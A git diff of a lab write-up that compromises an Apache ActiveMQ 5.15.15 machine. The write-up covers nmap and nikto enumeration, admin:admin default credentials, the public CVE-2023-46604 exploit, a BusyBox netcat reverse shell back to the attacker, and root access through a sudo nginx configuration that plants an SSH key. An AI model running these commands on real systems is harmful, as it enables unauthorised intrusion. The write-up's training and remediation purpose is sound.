@@ -6,12 +6,21 @@
 
 - Difficulty: Easy
 - Platform: Linux
-- Skills Demonstrated: Web Exploitation, Default Credential Abuse, Exploitation of Known Vulnerabilites, Linux Privilege Escalation, Sudo Misconfiguration Abuse
+- Skills Demonstrated: Web Exploitation, Default Credential Abuse, Exploitation of Known Vulnerabilities, Linux Privilege Escalation, Sudo Misconfiguration Abuse
 
+## Methodology
+
+The assessment followed a standard attack methodology:
+
+1. Enumeration
+2. Vulnerability Identification
+3. Initial Access
+4. Privilege Escalation
+5. Post Exploitation
 ---
 ## Enumeration 
 
-Initial reconnaissance was performed using Nmap to identify open ports, services and versions. 
+Initial reconnaissance was performed using Nmap to identify open ports, services, and versions. 
 ```
 nmap -sCV -A -p- 10.129.230.87
 ```
@@ -77,7 +86,7 @@ Key Findings:
 - Port 80 - HTTP (nginx)
 - Port 61616 - HTTP (ActiveMQ 5.15.15)
 
-Upon discovering open web application ports I run a Nikto scan 
+Upon discovering multiple HTTP services, a Nikto scan was performed to identify common web misconfigurations and default credentials 
 ```
 nikto -h 10.129.230.87
 ```
@@ -104,14 +113,14 @@ nikto -h 10.129.230.87
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```                                                       
-Before moving forward to port enumeration, through our intial reconnaissance we have already discovered the server is running the ActiveMQ service, the version number for this service (5.15.15) and that there is a default account enabled found by our Nikto scan
+Before moving forward to port enumeration, through our initial reconnaissance we have already discovered the server is running the ActiveMQ service, the version number for this service (5.15.15) and that a default account was identified by our Nikto scan
 ```
 Default account found for 'ActiveMQRealm' at (ID 'admin', PW 'admin')
 ```
 
-## Intial Access
+## Initial Access
 
-Navigating to port 80 issues us with a login prompt 
+Navigating to port 80 presents a login prompt 
 
 ![login](Images/login.png)
 
@@ -119,25 +128,25 @@ Trying the credentials we found earlier (admin:admin) was successful, we were al
 
 ![creds](Images/default-creds.png)
 
-Once we are authenticated, we are take to the welcome page for ActiveMQ. The top link 'Manage ActiveMQ broker' instantly grabbed my attention. This link reveals the /admin endpoint which reveals further confirms our previous findings relating to the version of the service running. 
+Once we are authenticated, we are take to the ActiveMQ welcome page. The top link `Manage ActiveMQ broker` instantly grabbed my attention. This link reveals the /admin endpoint and confirms our previous findings relating to the version of the service running. 
 
 ![home](Images/home.png)
 ![admin](Images/version.png)
 
-The target is running Apache ActiveMQ version 5.15.15. This version is affected by CVE-2023-46604, which can be leverage to achive remote code execution. A public exploit was found that generates a pseudo shell due to the unsafe deserialization within the OpenWire protocol.
+The target is running Apache ActiveMQ version 5.15.15. This version is affected by CVE-2023-46604, which can be leverage to achieve remote code execution. A public exploit was found that generates a pseudo shell due to the unsafe deserialization within the OpenWire protocol.
 
 <https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell/blob/master/README.md>
 
 ### Exploitation
 
-The vulnerability was confirmed and exploited using the following command, leading to successful remote code execution;
+The vulnerability was confirmed and exploited using the following command, leading to successful remote code execution:
 ```
 python3 exploit.py -i 10.129.230.87 -p 61616 -si 10.10.14.170 -sp 8080
 ```
 
 ![exploit](Images/exploit.png)
 
-A BusyBox reverse shell was used to upgrade the intial foothold into a more stable and interactive shell for further exploitation. 
+A BusyBox reverse shell was used to upgrade the initial foothold into a more stable and interactive shell for further exploitation. 
 
 ```
 busybox nc 10.10.14.170 4444 -e /bin/bash
@@ -145,11 +154,11 @@ busybox nc 10.10.14.170 4444 -e /bin/bash
 
 ![shell](Images/shell.png)
 
-The user.txt flag can be found in the `/home/activemq` directory 
+The `user.txt` flag can be found in the `/home/activemq` directory 
 
 ## Privilege Escalation
 
-As part of my post-exploitation methodology, sudo privileges were reviewd to idenitfy potential privilege vectors.
+As part of my post-exploitation methodology, sudo privileges were reviewed to identify potential privilege escalation vectors.
 ```
 sudo -l
 ```
@@ -160,12 +169,12 @@ This revealed that the user can run `/usr/sbin/nginx` with elevated privileges.
 After further enumeration a vulnerability was found that allowed a custom configuration file to be loaded with elevated privileges. 
 
 
-The exploit enabled WebDAV and exposed the filesystem,, allowing arbitrary file write. This was then leveraged to add a SSH public key resulting in root access via SSH.
+The exploit enabled WebDAV and exposed the filesystem, allowing arbitrary file writes. This was then leveraged to add a SSH public key resulting in root access via SSH.
 
 
 Exploit source: https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406
 
-The exploit was saved locally as `exploit.sh`, assigned execute permissions and then executed 
+The exploit was saved locally as `exploit.sh`, assigned executable permissions and then executed 
 ```
 chmod +x exploit.sh
 ```
@@ -173,7 +182,7 @@ chmod +x exploit.sh
 ./exploit.sh
 ```
 ![ssh](Images/ssh.png)
-- Ensuring to leave the prompts for 'file save' and 'password' blank
+Leave the prompts for "file save" and "password" blank
 
 Once successfully executed, store the generated private key and assign it the appropriate permissions to enable SSH for root access
 
@@ -183,7 +192,7 @@ Once successfully executed, store the generated private key and assign it the ap
 chmod 600 key
 ```
 
-SSH as root 
+SSH into the target as root 
 ```
 ssh -i key root@10.129.230.87
 ```
@@ -193,7 +202,7 @@ ssh -i key root@10.129.230.87
 
 ## Conclusion
 
-The target was successfully compromised by exploiting known vulnerbilites in Apache ActiveMQ (CVE-2023-46604), which enabled remote code execution. Intial Access was achieved using weak default credentials and a public exploit, followed by privilege escalation through misconfigured sudo permissions. 
+The target was successfully compromised by exploiting known vulnerabilities in Apache ActiveMQ (CVE-2023-46604), which enabled remote code execution. Initial access was achieved using weak default credentials and a public exploit, followed by privilege escalation through misconfigured sudo permissions. 
 
 ## Lessons Learned
 
@@ -203,9 +212,9 @@ This lab was especially useful in understanding how simple enumeration and small
 
 ## Remediation
 
-To mitigate the vulnerabilites found in the system, the following actions should be taken:
+To mitigate the vulnerabilities found in the system, the following actions should be taken:
 - Upgrade Apache ActiveMQ to a patched version not affected by CVE-2023-46604
 - Disable or restrict endpoints to untrusted networks
 - Enforce strong authentication and password policies
 - Restrict sudo permissions to prevent execution of privileged services
-- Disable unnecesary services and ports 
+- Disable unnecessary services and ports 
